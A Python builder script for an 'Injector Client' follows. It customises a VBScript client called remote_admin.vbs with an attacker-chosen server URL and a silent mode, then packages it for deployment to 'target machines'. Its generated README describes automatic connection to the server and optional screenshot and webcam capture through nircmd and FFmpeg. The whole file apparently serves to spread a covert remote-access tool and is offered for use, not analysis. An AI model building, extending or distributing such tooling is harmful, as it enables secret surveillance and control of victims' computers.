#!/usr/bin/env python3
"""
Injector Client Manager
=======================
A utility script for managing and deploying the VBScript client to multiple machines.

Features:
- Generate customized client scripts
- Package client with dependencies
- Create deployment packages
- Manage client configurations

Usage:
    python client_manager.py [command] [options]
    
Commands:
    generate    - Generate customized client script
    package     - Create deployment package
    list       - List available clients
    help       - Show this help message
"""

import os
import sys
import json
import shutil
import zipfile
from datetime import datetime
from pathlib import Path

# Color codes for output
class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'

# ASCII Art
ASCII_HEADER = r"""
  _____ _ _       _____ _____ ____  _   _ _____ ____
 |_   _| | | ___ |_   _| ____|  _ \| | | |_   _|  _ \
   | | | | |/ _ \  | | |  _| | |_) | | | | | | | |_) |
   | | | |_|  __/  | | | |___|  _ <| |_| | | | |  _ <
   |_|  \___|\___|  |_| |_____|_| \_\\___/  |_| |_| \_\
"""

# Configuration
CLIENT_SCRIPT = "remote_admin.vbs"
DEPLOYMENT_DIR = "deployment"
CONFIG_FILE = "client_config.json"
NIRCMD_URL = "https://www.nirsoft.net/utils/nircmd.zip"
FFMPEG_URL = "https://ffmpeg.org/download.html"

# Default client configurations
DEFAULT_CONFIG = {
    "server_url": "http://localhost:8080",
    "client_name": "injector_client",
    "auto_start": False,
    "silent_mode": False,
    "dependencies": {
        "nircmd": False,
        "ffmpeg": False
    }
}

def print_header():
    """Print the ASCII art header."""
    print(f"\n{Colors.HEADER}{ASCII_HEADER}{Colors.ENDC}")
    print(f"{Colors.CYAN}Injector Client Manager{Colors.ENDC}")
    print(f"{Colors.HEADER}{'='*60}{Colors.ENDC}\n")

def print_help():
    """Print help message."""
    print_header()
    print(f"{Colors.OKBLUE}Usage:{Colors.ENDC}")
    print(f"  python client_manager.py [command] [options]")
    print()
    print(f"{Colors.OKBLUE}Commands:{Colors.ENDC}")
    print(f"  {Colors.CYAN}generate{Colors.ENDC}    - Generate customized client script")
    print(f"  {Colors.CYAN}package{Colors.ENDC}     - Create deployment package")
    print(f"  {Colors.CYAN}list{Colors.ENDC}       - List available clients")
    print(f"  {Colors.CYAN}config{Colors.ENDC}     - Manage client configurations")
    print(f"  {Colors.CYAN}help{Colors.ENDC}       - Show this help message")
    print()
    print(f"{Colors.OKBLUE}Examples:{Colors.ENDC}")
    print(f"  python client_manager.py generate --server http://192.168.1.100:8080")
    print(f"  python client_manager.py package --name office_client --output office_deploy.zip")
    print(f"  python client_manager.py list")
    print()

def ensure_directories():
    """Ensure required directories exist."""
    directories = [DEPLOYMENT_DIR]
    for directory in directories:
        if not os.path.exists(directory):
            os.makedirs(directory, exist_ok=True)
            print(f"{Colors.OKGREEN}[+] Created directory: {directory}{Colors.ENDC}")

def load_config():
    """Load client configuration."""
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, 'r') as f:
                return json.load(f)
        except Exception as e:
            print(f"{Colors.WARNING}[!] Error loading config: {str(e)}{Colors.ENDC}")
            return DEFAULT_CONFIG
    return DEFAULT_CONFIG

def save_config(config):
    """Save client configuration."""
    try:
        with open(CONFIG_FILE, 'w') as f:
            json.dump(config, f, indent=2)
        print(f"{Colors.OKGREEN}[+] Configuration saved{Colors.ENDC}")
    except Exception as e:
        print(f"{Colors.FAIL}[-] Error saving config: {str(e)}{Colors.ENDC}")

def generate_client(server_url=None, client_name=None, silent=False, include_nircmd=False, include_ffmpeg=False):
    """Generate a customized client script."""
    print(f"{Colors.OKBLUE}[*] Generating customized client script{Colors.ENDC}")
    
    # Load the base client script
    if not os.path.exists(CLIENT_SCRIPT):
        print(f"{Colors.FAIL}[-] Client script not found: {CLIENT_SCRIPT}{Colors.ENDC}")
        return False
    
    try:
        with open(CLIENT_SCRIPT, 'r') as f:
            client_content = f.read()
    except Exception as e:
        print(f"{Colors.FAIL}[-] Error reading client script: {str(e)}{Colors.ENDC}")
        return False
    
    # Customize the client script
    if server_url:
        # Replace the default server URL
        client_content = client_content.replace(
            'Const SERVER_URL = "http://localhost:8080"',
            f'Const SERVER_URL = "{server_url}"'
        )
        print(f"{Colors.OKGREEN}[+] Set server URL: {server_url}{Colors.ENDC}")
    
    if client_name:
        # Add client name as a comment
        header_comment = f"' Injector Client: {client_name}\n"
        client_content = header_comment + client_content
        print(f"{Colors.OKGREEN}[+] Set client name: {client_name}{Colors.ENDC}")
    
    if silent:
        # Add silent mode (no popup windows)
        client_content = client_content.replace(
            'wscript remote_admin.vbs',
            'cscript //nologo remote_admin.vbs'
        )
        print(f"{Colors.OKGREEN}[+] Enabled silent mode{Colors.ENDC}")
    
    # Create deployment directory
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    deploy_dir = os.path.join(DEPLOYMENT_DIR, f"client_{timestamp}")
    os.makedirs(deploy_dir, exist_ok=True)
    
    # Save customized client
    output_file = os.path.join(deploy_dir, client_name or "remote_admin.vbs")
    with open(output_file, 'w') as f:
        f.write(client_content)
    
    print(f"{Colors.OKGREEN}[+] Customized client saved: {output_file}{Colors.ENDC}")
    
    # Include dependencies if requested
    if include_nircmd:
        print(f"{Colors.WARNING}[!] nircmd.exe not automatically downloaded. Please download from: {NIRCMD_URL}{Colors.ENDC}")
        print(f"{Colors.WARNING}[!] Place nircmd.exe in the deployment directory or system path{Colors.ENDC}")
    
    if include_ffmpeg:
        print(f"{Colors.WARNING}[!] FFmpeg not automatically downloaded. Please download from: {FFMPEG_URL}{Colors.ENDC}")
        print(f"{Colors.WARNING}[!] Add FFmpeg to system PATH on target machines{Colors.ENDC}")
    
    # Create README for deployment
    readme_content = f"""Injector Client Deployment
================================

Client Name: {client_name or 'Unnamed'}
Server URL: {server_url or 'http://localhost:8080'}
Generated: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}

DEPLOYMENT INSTRUCTIONS:
1. Copy all files in this directory to the target machine
2. Double-click remote_admin.vbs to run
3. Or execute from command line: cscript remote_admin.vbs

DEPENDENCIES:
"""
    
    if include_nircmd:
        readme_content += "- nircmd.exe (for screenshot capture) - Download from: https://www.nirsoft.net/utils/nircmd.html\n"
    if include_ffmpeg:
        readme_content += "- FFmpeg (for webcam capture) - Download from: https://ffmpeg.org/\n"
    
    readme_content += "\nNOTES:\n"
    if silent:
        readme_content += "- Silent mode enabled (no popup windows)\n"
    readme_content += "- Client will automatically connect to the specified server\n"
    readme_content += "- First run will generate a unique client ID\n"
    
    with open(os.path.join(deploy_dir, "README.txt"), 'w') as f:
        f.write(readme_content)
    
    print(f"{Colors.OKGREEN}[+] Deployment README created{Colors.ENDC}")
    print(f"{Colors.OKGREEN}[+] Deployment directory: {deploy_dir}{Colors.ENDC}")
    
    return True

def create_package(name=None, output=None, server_url=None, include_nircmd=False, include_ffmpeg=False):
    """Create a deployment package."""
    print(f"{Colors.OKBLUE}[*] Creating deployment package{Colors.ENDC}")
    
    # Generate client first
    if not generate_client(server_url, name, include_nircmd=include_nircmd, include_ffmpeg=include_ffmpeg):
        return False
    
    # Find the most recent deployment directory
    deploy_dirs = [d for d in os.listdir(DEPLOYMENT_DIR) if os.path.isdir(os.path.join(DEPLOYMENT_DIR, d))]
    if not deploy_dirs:
        print(f"{Colors.FAIL}[-] No deployment directory found{Colors.ENDC}")
        return False
    
    deploy_dirs.sort(reverse=True)
    latest_deploy = os.path.join(DEPLOYMENT_DIR, deploy_dirs[0])
    
    # Determine output filename
    if not output:
        output = f"{name or 'injector_client'}_deploy_{datetime.now().strftime('%Y%m%d_%H%M%S')}.zip"
    
    # Create zip package
    try:
        with zipfile.ZipFile(output, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for root, dirs, files in os.walk(latest_deploy):
                for file in files:
                    file_path = os.path.join(root, file)
                    arcname = os.path.relpath(file_path, DEPLOYMENT_DIR)
                    zipf.write(file_path, arcname)
        
        print(f"{Colors.OKGREEN}[+] Deployment package created: {output}{Colors.ENDC}")
        print(f"{Colors.OKGREEN}[+] Package size: {os.path.getsize(output)} bytes{Colors.ENDC}")
        
        return True
        
    except Exception as e:
        print(f"{Colors.FAIL}[-] Error creating package: {str(e)}{Colors.ENDC}")
        return False

def list_clients():
    """List available client configurations."""
    print(f"{Colors.OKBLUE}[*] Listing client configurations{Colors.ENDC}")
    
    config = load_config()
    
    if not config:
        print(f"{Colors.WARNING}[!] No configurations found{Colors.ENDC}")
        return
    
    print(f"\n{Colors.HEADER}Client Configurations:{Colors.ENDC}")
    print(f"  Server URL: {config.get('server_url', 'Not set')}")
    print(f"  Client Name: {config.get('client_name', 'Not set')}")
    print(f"  Auto Start: {config.get('auto_start', False)}")
    print(f"  Silent Mode: {config.get('silent_mode', False)}")
    
    print(f"\n{Colors.HEADER}Dependencies:{Colors.ENDC}")
    deps = config.get('dependencies', {})
    print(f"  nircmd: {deps.get('nircmd', False)}")
    print(f"  ffmpeg: {deps.get('ffmpeg', False)}")
    
    # List deployment directories
    if os.path.exists(DEPLOYMENT_DIR):
        deploy_dirs = [d for d in os.listdir(DEPLOYMENT_DIR) if os.path.isdir(os.path.join(DEPLOYMENT_DIR, d))]
        if deploy_dirs:
            print(f"\n{Colors.HEADER}Deployment Directories:{Colors.ENDC}")
            for i, deploy_dir in enumerate(deploy_dirs, 1):
                dir_path = os.path.join(DEPLOYMENT_DIR, deploy_dir)
                size = sum(os.path.getsize(os.path.join(dir_path, f)) for f in os.listdir(dir_path) if os.path.isfile(os.path.join(dir_path, f)))
                print(f"  {i}. {deploy_dir} ({size} bytes)")

def config_manager():
    """Interactive configuration manager."""
    print(f"{Colors.OKBLUE}[*] Client Configuration Manager{Colors.ENDC}")
    
    config = load_config()
    
    while True:
        print(f"\n{Colors.HEADER}Current Configuration:{Colors.ENDC}")
        print(f"  1. Server URL: {config.get('server_url', 'Not set')}")
        print(f"  2. Client Name: {config.get('client_name', 'Not set')}")
        print(f"  3. Auto Start: {config.get('auto_start', False)}")
        print(f"  4. Silent Mode: {config.get('silent_mode', False)}")
        print(f"  5. Dependencies:")
        print(f"     - nircmd: {config.get('dependencies', {}).get('nircmd', False)}")
        print(f"     - ffmpeg: {config.get('dependencies', {}).get('ffmpeg', False)}")
        print(f"  6. Save and Exit")
        print(f"  7. Exit without saving")
        
        choice = input(f"\n{Colors.OKBLUE}[?] Select option to edit (1-7): {Colors.ENDC}").strip()
        
        if choice == '1':
            server_url = input(f"{Colors.OKBLUE}[?] Enter server URL (e.g., http://192.168.1.100:8080): {Colors.ENDC}").strip()
            if server_url:
                config['server_url'] = server_url
        elif choice == '2':
            client_name = input(f"{Colors.OKBLUE}[?] Enter client name: {Colors.ENDC}").strip()
            if client_name:
                config['client_name'] = client_name
        elif choice == '3':
            auto_start = input(f"{Colors.OKBLUE}[?] Enable auto start? (y/n): {Colors.ENDC}").strip().lower()
            config['auto_start'] = auto_start == 'y'
        elif choice == '4':
            silent_mode = input(f"{Colors.OKBLUE}[?] Enable silent mode? (y/n): {Colors.ENDC}").strip().lower()
            config['silent_mode'] = silent_mode == 'y'
        elif choice == '5':
            print(f"{Colors.OKBLUE}[?] Edit dependencies:{Colors.ENDC}")
            print(f"  1. nircmd: {config.get('dependencies', {}).get('nircmd', False)}")
            print(f"  2. ffmpeg: {config.get('dependencies', {}).get('ffmpeg', False)}")
            dep_choice = input(f"{Colors.OKBLUE}[?] Select dependency to edit (1-2): {Colors.ENDC}").strip()
            
            if dep_choice == '1':
                nircmd = input(f"{Colors.OKBLUE}[?] Include nircmd? (y/n): {Colors.ENDC}").strip().lower()
                if 'dependencies' not in config:
                    config['dependencies'] = {}
                config['dependencies']['nircmd'] = nircmd == 'y'
            elif dep_choice == '2':
                ffmpeg = input(f"{Colors.OKBLUE}[?] Include ffmpeg? (y/n): {Colors.ENDC}").strip().lower()
                if 'dependencies' not in config:
                    config['dependencies'] = {}
                config['dependencies']['ffmpeg'] = ffmpeg == 'y'
        elif choice == '6':
            save_config(config)
            print(f"{Colors.OKGREEN}[+] Configuration saved{Colors.ENDC}")
            break
        elif choice == '7':
            print(f"{Colors.WARNING}[!] Configuration not saved{Colors.ENDC}")
            break
        else:
            print(f"{Colors.FAIL}[-] Invalid option{Colors.ENDC}")

def main():
    """Main entry point."""
    print_header()
    
    # Ensure directories exist
    ensure_directories()
    
    # Parse command line arguments
    if len(sys.argv) < 2:
        print_help()
        return
    
    command = sys.argv[1].lower()
    args = sys.argv[2:]
    
    # Parse arguments
    server_url = None
    client_name = None
    output = None
    silent = False
    include_nircmd = False
    include_ffmpeg = False
    
    i = 0
    while i < len(args):
        arg = args[i]
        if arg in ['--server', '-s'] and i + 1 < len(args):
            server_url = args[i + 1]
            i += 2
        elif arg in ['--name', '-n'] and i + 1 < len(args):
            client_name = args[i + 1]
            i += 2
        elif arg in ['--output', '-o'] and i + 1 < len(args):
            output = args[i + 1]
            i += 2
        elif arg in ['--silent', '-q']:
            silent = True
            i += 1
        elif arg in ['--nircmd', '-n']:
            include_nircmd = True
            i += 1
        elif arg in ['--ffmpeg', '-f']:
            include_ffmpeg = True
            i += 1
        else:
            i += 1
    
    # Execute command
    if command == 'generate':
        if not generate_client(server_url, client_name, silent, include_nircmd, include_ffmpeg):
            sys.exit(1)
    elif command == 'package':
        if not create_package(client_name, output, server_url, include_nircmd, include_ffmpeg):
            sys.exit(1)
    elif command == 'list':
        list_clients()
    elif command == 'config':
        config_manager()
    elif command in ['help', '--help', '-h']:
        print_help()
    else:
        print(f"{Colors.FAIL}[-] Unknown command: {command}{Colors.ENDC}")
        print_help()
        sys.exit(1)

if __name__ == '__main__':
    main()